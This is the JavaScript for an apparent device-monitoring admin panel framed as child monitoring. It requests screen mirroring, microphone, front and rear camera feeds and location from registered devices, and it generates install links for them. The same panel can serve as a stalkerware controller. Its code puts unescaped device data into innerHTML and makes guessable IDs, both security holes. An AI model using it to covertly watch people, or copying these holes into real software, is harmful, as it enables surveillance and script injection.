let ws;
let devices = [];
let selectedDevice = null;

function connect() {
    ws = new WebSocket(`ws://${window.location.host}?type=admin`);
    
    ws.onopen = () => {
        console.log('Connected');
        loadOfflineDevices();
    };
    
    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.type === 'devices') {
            devices = data.devices;
            saveOfflineDevices();
            renderDevices();
        } else if (data.type === 'device_update') {
            const idx = devices.findIndex(d => d.id === data.device.id);
            if (idx >= 0) devices[idx] = data.device;
            else devices.push(data.device);
            saveOfflineDevices();
            renderDevices();
        } else if (data.type === 'location') {
            updateLocation(data.deviceId, data.lat, data.lng);
        } else if (data.type === 'screen') {
            displayScreen(data.image);
        } else if (data.type === 'audio') {
            displayAudio(data.audio);
        } else if (data.type === 'camera') {
            displayCamera(data.image);
        }
    };
    
    ws.onclose = () => setTimeout(connect, 3000);
}

function saveOfflineDevices() {
    localStorage.setItem('devices', JSON.stringify(devices));
}

function loadOfflineDevices() {
    const stored = localStorage.getItem('devices');
    if (stored) {
        devices = JSON.parse(stored);
        renderDevices();
    }
}

function renderDevices() {
    const list = document.getElementById('deviceList');
    list.innerHTML = devices.map(d => `
        <div class="device-card ${d.status}" onclick="selectDevice('${d.id}')">
            <h3>${d.name}</h3>
            <span class="status">${d.status}</span>
            <p>Location: ${d.lat ? d.lat.toFixed(4) : '0.0000'}, ${d.lng ? d.lng.toFixed(4) : '0.0000'}</p>
        </div>
    `).join('');
}

function selectDevice(id) {
    selectedDevice = devices.find(d => d.id === id);
    showTab('monitor');
    document.getElementById('monitorContent').innerHTML = `
        <h3>${selectedDevice.name}</h3>
        <div class="monitor-grid">
            <div class="monitor-box">
                <h4>Screen Mirror</h4>
                <div id="screenView" class="view">Waiting...</div>
                <button onclick="startScreen()">Start Screen</button>
            </div>
            <div class="monitor-box">
                <h4>Microphone</h4>
                <div id="audioView" class="view">Waiting...</div>
                <button onclick="startAudio()">Start Audio</button>
            </div>
            <div class="monitor-box">
                <h4>Camera</h4>
                <div id="cameraView" class="view">Waiting...</div>
                <button onclick="startCamera('front')">Front Camera</button>
                <button onclick="startCamera('rear')">Rear Camera</button>
            </div>
            <div class="monitor-box">
                <h4>Location</h4>
                <div id="locationView" class="view">
                    <p>Lat: ${selectedDevice.lat || 0}</p>
                    <p>Lng: ${selectedDevice.lng || 0}</p>
                </div>
            </div>
        </div>
    `;
}

function startScreen() {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_screen', deviceId: selectedDevice.id }));
    }
}

function startAudio() {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_audio', deviceId: selectedDevice.id }));
    }
}

function startCamera(type) {
    if (selectedDevice) {
        ws.send(JSON.stringify({ type: 'request_camera', deviceId: selectedDevice.id, camera: type }));
    }
}

function displayCamera(image) {
    document.getElementById('cameraView').innerHTML = `<img src="${image}" style="width:100%;height:auto;">`;
}

function displayScreen(image) {
    document.getElementById('screenView').innerHTML = `<img src="${image}" style="width:100%;height:auto;">`;
}

function displayAudio(level) {
    document.getElementById('audioView').innerHTML = `<div class="audio-level">🎤 Level: ${level}</div>`;
}

function updateLocation(deviceId, lat, lng) {
    const device = devices.find(d => d.id === deviceId);
    if (device) {
        device.lat = lat;
        device.lng = lng;
        if (selectedDevice && selectedDevice.id === deviceId) {
            document.getElementById('locationView').innerHTML = `
                <p>Lat: ${lat.toFixed(4)}</p>
                <p>Lng: ${lng.toFixed(4)}</p>
            `;
        }
    }
}

function generateLink() {
    const name = document.getElementById('childName').value;
    if (!name) return alert('Enter name');
    
    const id = Math.random().toString(36).substr(2, 8);
    const link = `http://${window.location.host}/device.html?id=${id}&name=${encodeURIComponent(name)}`;
    
    fetch('/api/device/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, name })
    });
    
    document.getElementById('installLink').value = link;
    document.getElementById('linkBox').style.display = 'block';
}

function copyLink() {
    const input = document.getElementById('installLink');
    input.select();
    document.execCommand('copy');
    alert('Link copied!');
}

function showTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.sidebar button').forEach(b => b.classList.remove('active'));
    document.getElementById(tab).classList.add('active');
    event.target.classList.add('active');
}

connect();
